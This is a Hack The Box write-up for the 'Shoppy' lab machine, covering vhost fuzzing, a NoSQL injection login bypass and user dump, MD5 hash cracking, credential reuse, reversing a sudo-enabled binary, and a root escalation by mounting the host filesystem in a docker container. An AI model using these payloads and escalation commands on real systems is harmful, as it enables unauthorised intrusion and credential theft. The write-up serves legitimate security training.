---
title: "HTB • Shoppy"
tags:
  - "NoSQL Injection"
  - "Database"
  - "Intermediate"
  - "Docker"
  - "Reversing"
  - "Web"
  - "Linux"
  - "Easy Difficulty"
excerpt: "Shoppy is an easy-difficulty Linux machine on Hack the Box that involves subdomain enumeration, NoSQL injection, and reversing. Some tools we use to solve this machine are Radare2, Dirsearch, and FFUF"
categories:
  - "Writeups"
  - "Hack the Box Machines"
---

Shoppy is an easy Linux machine created by [**lockscan**](https://app.hackthebox.com/users/217870) on [**Hack The Box**](https://app.hackthebox.com/machines/Shoppy) that features a website with a NoSQL injection vulnerability that allows us to authenticate as the admin user. With a little help from another NoSQL injection vulnerability, we are able to extract and recover the password for the user **josh**. These credentials are valid on a virtual subdomain with a chat room containing the password for **jaeger**. Now these credentials are valid on the SSH server, so we login and grab the user flag. We recover the password for the user **deploy** by reverse-engineering a binary that allows us to read the user's password. We then read the root flag by mounting the root filesystem inside a docker container and interacting with it.

## Initial Recon

Let's first set up our environment and run a TCP port scan with [this custom nmap wrapper](https://github.com/bryanmcnulty/ctf-scripts/blob/main/recon/active/ctf-portscan.sh).

```bash
# bryan@attacker
rhost="" # replace with machine address
echo rhost=$rhost >> .env && . ./.env
ctfscan $rhost
```
{:.nolineno}

The scan reports the following ports as open:

| Port | Service | Product | Version                |
|------|---------|---------|:-----------------------|
| 22   | SSH     | OpenSSH | 8.4p1 Debian 5+deb11u1 |
| 80   | HTTP    | nginx   | 1.23.1                 |
| 9093 | HTTP    |         |                        |

## Web

Let's get some basic information about the web server running on port **80** with [WhatWeb](https://github.com/urbanadventurer/WhatWeb)

```bash
# bryan@attacker
whatweb "$rhost:80"
```
{:.nolineno}

We are redirected to [http://shoppy.htb](http://shoppy.htb/) which probably means that the server expects the hostname **shoppy.htb** for any requests. We'll add the hostname to `/etc/hosts`{:.filepath} and our environment file.

```bash
# bryan@attacker
echo 'vhost=shoppy.htb' >> .env && . ./.env
echo -e "$rhost\\t$vhost" | sudo tee -a /etc/hosts
```

Now when we visit [http://shoppy.htb](http://shoppy.htb/) in our browser, we don't get redirected.

![Home Page](/assets/img/post/htb-machines-shoppy/home.png)
_Initial contact with the web server on port 80_

### Subdomain Brute-Force

There isn't anything immediately interesting on the site, so it would probably be a good idea to brute-force any virtual subdomains with [ffuf](https://github.com/ffuf/ffuf) and [this wordlist](https://raw.githubusercontent.com/danielmiessler/SecLists/1ef4dcb96e75a670e955302a53380c5bb4f36b53/Discovery/DNS/bitquark-subdomains-top100000.txt).

```bash
# bryan@attacker
ffuf \
  -u "http://$vhost/" \
  -H "Host: FUZZ.$vhost" \
  -w ./bitquark-subdomains-top100000.txt \
  -mc all \
  -fc 301
```
{:.nolineno}

The **mattermost** subdomain is returned, so let's add that to `/etc/hosts`{:.filepath} and visit it in our browser.

```bash
# bryan@attacker
sudo sed -i -E "s/\t($vhost)$/\t\1 mattermost.\1/g" /etc/hosts
chromium "http://mattermost.$vhost"
```
{:.nolineno}

![Mattermost site](/assets/img/post/htb-machines-shoppy/mattermost.png)
_We find a VHost that is hosting the Mattermost project management software_

the site seems to be using [Mattermost](https://mattermost.com/) project management software, which requires authentication. It doesn't look like there are any public unauthenticated exploits for this, so we'll move on to fuzzing the main site at [http://shoppy.htb](http://shoppy.htb/) for content with [dirsearch](https://github.com/maurosoria/dirsearch).

```bash
# bryan@attacker
dirsearch -u "http://$vhost/" -e html,txt
```
{:.nolineno}

We find the notable [/admin](http://shoppy.htb/admin) and [/login](http://shoppy.htb/login) endpoints.

### Shoppy Login

The admin endpoint just redirects us to the login page, presumably because we aren't authenticated.

![Login page](/assets/img/post/htb-machines-shoppy/login.png)
_We probably need to get past this login page_

#### Authentication Bypass

When doing some manual injection fuzzing at [/login](http://shoppy.htb/login), we find out that a username value with a single quote will cause the application to hang, while a username value with double quotes will pass normally. This is a good indicator of an injection vulnerability. It must be noted that SQL injection or NoSQL injection are the most probable for login functionality.

We notice when submitting `' OR ''='` as the username value the application hangs, but when we submit `'||''=='` it doesn't. This probably means that we have a NoSQL injection vulnerability rather than plain old SQL injection because most NoSQL solutions use operators similar to javascript rather than traditional SQL syntax. Now if this is truly an injection point, we could authenticate as the user **admin** by entering `admin'||''=='` as the username.

![Admin dashboard](/assets/img/post/htb-machines-shoppy/admin.png)
_We successfully exploit the NoSQL injection vulnerability in order to bypass authentication_

It works! Now we'll see what actions we can take as the admin to get some leverage.

### Admin Dashboard

There seems to be an option to search for users. When we enter "admin", we get an option to download an export which contains a password hash for the user. When we enter "adm" though, it claims there are no results. This suggests that our query has to match an exact username instead of just a similar username. Since we were able to utilize NoSQL injection once, why not try it again? Entering `'||''=='`, will return an export of all users.

#### Hash Cracking

Let's try to crack the hashes we found for the users **admin** and **josh** with [John the Ripper](https://github.com/openwall/john) and `rockyou.txt`{:.filepath}.

```bash
# bryan@attacker
admin_hash="" # admin's hash here
josh_hash=""  # josh's hash here
echo "admin:$admin_hash" > ./md5.john
echo "josh:$josh_hash"  >> ./md5.john
john ./md5.john \
  --format="Raw-MD5" \
  --wordlist="rockyou.txt" \
```
{:.nolineno}

The hash for _josh_ is cracked and now we have a set of credentials that happen to be valid at the mattermost login page.

### Mattermost

![Mattermost chat](/assets/img/post/htb-machines-shoppy/chat.png)
_Plaintext credentials thrown in the Mattermost chat_

Upon logging in, we are immediately presented with another set of credentials, sent by **jaeger** in the chat room. It turns out, these credentials work for SSH so we'll establish an SSH session now.

```bash
# bryan@attacker
ssh "jaeger@$rhost"
```
{:.nolineno}

## Privilege Escalation

As a part of enumeration, we run `sudo -l` and find out that our current user can run `/home/deploy/password-manager`{:.filepath} as **deploy**

>
```
User jaeger may run the following commands on shoppy:
  (deploy) /home/deploy/password-manager
```
{:.nolineno}


### Password Manager

When we execute `/home/deploy/password-manager`{:.filepath}, it asks for a password.

```bash
# jaeger@10.10.11.180 (SSH)
sudo -u "deploy" /home/deploy/password-manager
```
{:.nolineno}

>
```
Welcome to Josh password manager!
Please enter your master password: 
```
{:.nolineno}

All we have to do here is hopefully find the password within the program. So we'll download the file with the `scp` command and analyze it with [radare2](https://github.com/radareorg/radare2/)

```bash
# bryan@attacker
scp "jaeger@$rhost:/home/deploy/password-manager" .
file ./password-manager # It's an ELF executable
radare2 -AA ./password-manager
```
{:.nolineno}

It looks like the file compares our input to the string "Sample" and calls `system("cat /home/deploy/creds.txt")` if they match. This is exactly the case when we run it again. A password for the user **deploy** shows up in the output and it turns out to be valid on this machine.

```bash
# jaeger@10.10.11.180 (SSH)
sudo -u "deploy" /home/deploy/password-manager
```
{:.nolineno}
>
```
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: [REDACTED]
```
{:.nolineno}

Let's login as this user and see what new privileges we have.

```bash
# bryan@attacker
ssh "deploy@$rhost"
```
{:.nolineno}

### Docker Group Escalation

The `id` command indicates that our current user is part of the **docker** group. This is great news for us because membership to the docker group could allow us full access to this machine. All we have to do is mount the root filesystem on a new container, and read the root flag at `/root/root.txt`{:.filepath}.

```bash
# deploy@10.10.11.180 (SSH)
docker images # the alpine image is available
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
{:.nolineno}
